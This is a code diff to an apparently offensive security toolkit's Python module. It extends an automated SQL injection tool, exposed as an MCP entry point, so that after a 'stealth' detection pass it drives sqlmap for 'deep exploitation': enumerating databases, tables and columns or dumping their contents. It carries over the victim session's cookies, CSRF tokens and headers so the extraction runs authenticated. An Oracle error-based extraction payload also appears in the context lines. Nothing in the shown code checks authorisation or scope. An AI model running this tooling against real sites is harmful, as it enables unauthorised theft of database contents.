@@ -14,8 +14,15 @@ Automates the entire SQL injection workflow:
 """
 
 import re
+import shutil
+import subprocess
+import tempfile
 import time
 from typing import Optional
+from pathlib import Path
+from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
+
+from core.sqli_detect import SqliDetector
 
 try:
     from tools.probe import _get_session
@@ -764,8 +771,215 @@ def oracle_error_extract(query: str) -> str:
     return f"' AND TO_CHAR(1/0)=({query})--"
 
 
-def auto_sqli_impl(base_url: str, param: str = "category",
-                   method: str = "GET", headers: dict = None) -> dict:
-    """Run automated SQLi scan. Entry point for MCP tool."""
-    engine = AutoSQLi(base_url, param, method, headers=headers)
-    return engine.run_full_scan()
+DEEP_ACTIONS = {
+    "databases": "--dbs",
+    "tables": "--tables",
+    "columns": "--columns",
+    "dump": "--dump",
+}
+
+
+def _cookie_header(session) -> str:
+    cookies = getattr(session, "cookies", None)
+    if cookies is None:
+        return ""
+    if hasattr(cookies, "get_dict"):
+        values = cookies.get_dict()
+    elif isinstance(cookies, dict):
+        values = cookies
+    else:
+        values = {
+            cookie.name: cookie.value
+            for cookie in cookies
+            if getattr(cookie, "name", None)
+        }
+    return "; ".join(f"{name}={value}" for name, value in values.items())
+
+
+def _session_csrf_tokens(session) -> dict[str, str]:
+    client = getattr(session, "client", None)
+    session_id = getattr(session, "session_id", "")
+    runtime = client._runtime_for_session_id(session_id) if client is not None and session_id else None
+    if not runtime:
+        return {}
+    return {
+        str(name): str(value)
+        for name, value in runtime["state"].get("csrf_tokens", {}).items()
+        if "\r" not in str(name)
+        and "\n" not in str(name)
+        and "\r" not in str(value)
+        and "\n" not in str(value)
+    }
+
+
+def _session_headers(session, custom_headers: dict | None = None) -> dict[str, str]:
+    headers = {}
+    client = getattr(session, "client", None)
+    session_id = getattr(session, "session_id", "")
+    runtime = client._runtime_for_session_id(session_id) if client is not None and session_id else None
+    if runtime:
+        headers.update(client._headers(runtime["state"], getattr(session, "headers", {})))
+    else:
+        headers.update(getattr(session, "headers", {}) or {})
+    headers.update(custom_headers or {})
+    forbidden = {"host", "content-length", "transfer-encoding", "connection", "proxy-authorization", "cookie"}
+    return {
+        str(name): str(value)
+        for name, value in headers.items()
+        if str(name).casefold() not in forbidden
+        and "\r" not in str(name)
+        and "\n" not in str(name)
+        and "\r" not in str(value)
+        and "\n" not in str(value)
+    }
+
+
+def _sqlmap_request_file(
+    target: str,
+    param: str,
+    method: str,
+    cookie_header: str,
+    headers: dict[str, str],
+    form_values: dict[str, str] | None = None,
+) -> str:
+    parsed = urlsplit(target)
+    values = parse_qsl(parsed.query, keep_blank_values=True)
+    existing_names = {name for name, _ in values}
+    values.extend(
+        (name, value)
+        for name, value in (form_values or {}).items()
+        if name not in existing_names
+    )
+    if not any(name == param for name, _ in values):
+        values.append((param, "1"))
+    request_target = urlunsplit(("", "", parsed.path or "/", urlencode(values), ""))
+    body = ""
+    if method.upper() != "GET":
+        request_target = urlunsplit(("", "", parsed.path or "/", parsed.query, ""))
+        body = urlencode(values)
+        headers = {**headers, "Content-Type": "application/x-www-form-urlencoded"}
+    lines = [f"{method.upper()} {request_target} HTTP/1.1", f"Host: {parsed.netloc}"]
+    lines.extend(f"{name}: {value}" for name, value in headers.items())
+    if cookie_header and "\r" not in cookie_header and "\n" not in cookie_header:
+        lines.append(f"Cookie: {cookie_header}")
+    if body:
+        lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
+    lines.extend(["", body])
+    handle = tempfile.NamedTemporaryFile(
+        mode="w",
+        encoding="utf-8",
+        suffix=".http",
+        prefix="hunter-sqli-",
+        delete=False,
+    )
+    try:
+        handle.write("\r\n".join(lines))
+        return handle.name
+    finally:
+        handle.close()
+
+
+def _run_sqlmap(
+    *,
+    target: str,
+    param: str,
+    method: str,
+    deep_action: str,
+    cookie_header: str = "",
+    headers: dict | None = None,
+    csrf_tokens: dict[str, str] | None = None,
+) -> dict:
+    executable = shutil.which("sqlmap") or shutil.which("sqlmap.py")
+    if executable is None:
+        return {
+            "status": "unavailable",
+            "engine": "sqlmap",
+            "error": "sqlmap executable was not found",
+        }
+    request_path = _sqlmap_request_file(
+        target,
+        param,
+        method,
+        cookie_header,
+        dict(headers or {}),
+        form_values=csrf_tokens,
+    )
+    command = [
+        executable,
+        "-r",
+        request_path,
+        "-p",
+        param,
+        "--batch",
+        "--output-dir",
+        "evidence/sqlmap",
+        DEEP_ACTIONS[deep_action],
+    ]
+    try:
+        completed = subprocess.run(
+            command,
+            capture_output=True,
+            text=True,
+            timeout=900,
+            check=False,
+            shell=False,
+        )
+    finally:
+        Path(request_path).unlink(missing_ok=True)
+    return {
+        "status": "completed" if completed.returncode == 0 else "error",
+        "engine": "sqlmap",
+        "action": deep_action,
+        "returncode": completed.returncode,
+        "stdout": completed.stdout[-12000:],
+        "stderr": completed.stderr[-4000:],
+    }
+
+
+def auto_sqli_impl(
+    base_url: str,
+    param: str = "category",
+    method: str = "GET",
+    headers: dict = None,
+    session=None,
+    stealth_session_id: str | None = None,
+    case_slug: str = "",
+    deep_action: str = "",
+) -> dict:
+    """Detect SQLi with stealth HTTP and optionally hand off deep exploitation."""
+    active_session = session or (_get_session() if stealth_session_id else None)
+    detector = SqliDetector(
+        base_url,
+        param=param,
+        method=method,
+        session=active_session,
+        session_id=stealth_session_id,
+        headers=headers,
+        case_slug=case_slug,
+    )
+    result = detector.detect()
+    requested_action = str(deep_action or "").strip().lower()
+    if not requested_action:
+        return result
+    if requested_action not in DEEP_ACTIONS:
+        result["deep_exploitation"] = {
+            "status": "rejected",
+            "error": f"unsupported deep_action: {requested_action}",
+            "allowed_actions": sorted(DEEP_ACTIONS),
+        }
+    elif not result.get("vulnerable"):
+        result["deep_exploitation"] = {
+            "status": "skipped",
+            "reason": "lightweight detector did not confirm an injection point",
+        }
+    else:
+        result["deep_exploitation"] = _run_sqlmap(
+            target=base_url,
+            param=result.get("injection_point", param),
+            method=method,
+            deep_action=requested_action,
+            cookie_header=_cookie_header(detector.session),
+            headers=_session_headers(detector.session, headers),
+            csrf_tokens=_session_csrf_tokens(detector.session),
+        )
+    return result
